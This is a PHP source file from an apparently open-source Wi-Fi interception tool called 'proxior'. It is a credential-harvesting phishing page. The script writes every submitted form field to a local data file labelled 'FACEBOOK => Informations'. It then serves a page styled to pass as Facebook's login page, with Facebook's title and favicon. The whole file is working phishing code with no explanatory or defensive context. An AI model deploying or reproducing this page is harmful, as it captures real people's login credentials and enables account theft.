<?php 

/*
*  Copyright (c) 2019-2020 Barchampas Gerasimos <makindosxx@gmail.com>.
*  proxior is a wifi interception.
*
*  proxior is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxior is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


$path = getcwd();

$path = substr($path,0,16);

$file = $path ."/export/data.txt";


file_put_contents($file, print_r("\n\n\nFACEBOOK => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n\n\n", true), FILE_APPEND);

?>

<!-- <meta http-equiv="refresh" content="0; url=https://el-gr.facebook.com"/> -->



<html>
<head>

<title>Facebook - Log In or Sign Up</title>

<link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />

</head>
<body style="background-image:url(\\css\\error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
</body>
</html>
